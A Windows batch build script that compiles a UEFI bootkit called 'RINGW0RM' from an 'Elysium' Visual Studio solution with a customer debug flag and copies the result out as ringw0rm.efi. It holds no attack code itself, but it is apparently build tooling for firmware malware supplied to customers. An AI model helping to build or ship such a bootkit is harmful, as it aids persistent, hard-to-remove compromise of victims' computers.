@echo off
REM ============================================================
REM RINGW0RM Bootkit Build - CUSTOMER DEBUG Mode
REM Includes boot status output for troubleshooting
REM ============================================================

setlocal enabledelayedexpansion

set "PROJECT_DIR=%~dp0"
set "BOOTKIT_DIR=%PROJECT_DIR%Elysium\Bootkit"
set "OUTPUT_DIR=%PROJECT_DIR%plugins_customer_debug"

echo [BOOTKIT] Building Customer Debug bootkit...

REM Find Visual Studio
set "VSDEV="
if exist "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat" (
    set "VSDEV=C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\Common7\Tools\VsDevCmd.bat"
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\VsDevCmd.bat" (
    set "VSDEV=C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\Tools\VsDevCmd.bat"
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Professional\Common7\Tools\VsDevCmd.bat" (
    set "VSDEV=C:\Program Files\Microsoft Visual Studio\2022\Professional\Common7\Tools\VsDevCmd.bat"
)

if "%VSDEV%"=="" (
    echo [BOOTKIT] ERROR: Visual Studio 2022 not found!
    exit /b 1
)

call "%VSDEV%" -arch=amd64 >nul 2>&1

REM Build bootkit with CUSTOMER_DEBUG defined
echo [BOOTKIT] Compiling with CUSTOMER_DEBUG flag...

pushd "%PROJECT_DIR%Elysium"

REM Use msbuild with additional preprocessor define
msbuild "Elysium.sln" /p:Configuration=Release /p:Platform=x64 /v:minimal /nologo /p:PreprocessorDefinitions="CUSTOMER_DEBUG"
if errorlevel 1 (
    echo [BOOTKIT] ERROR: Bootkit build failed!
    popd
    exit /b 1
)

popd

REM Copy to output directory
if not exist "%OUTPUT_DIR%" mkdir "%OUTPUT_DIR%"

if exist "%PROJECT_DIR%Elysium\x64\bootx64.efi" (
    copy /Y "%PROJECT_DIR%Elysium\x64\bootx64.efi" "%OUTPUT_DIR%\ringw0rm.efi" >nul
    echo [BOOTKIT] ringw0rm.efi built with customer debug logging
) else (
    echo [BOOTKIT] WARNING: bootx64.efi not found
    exit /b 1
)

echo [BOOTKIT] Customer Debug bootkit build complete
exit /b 0
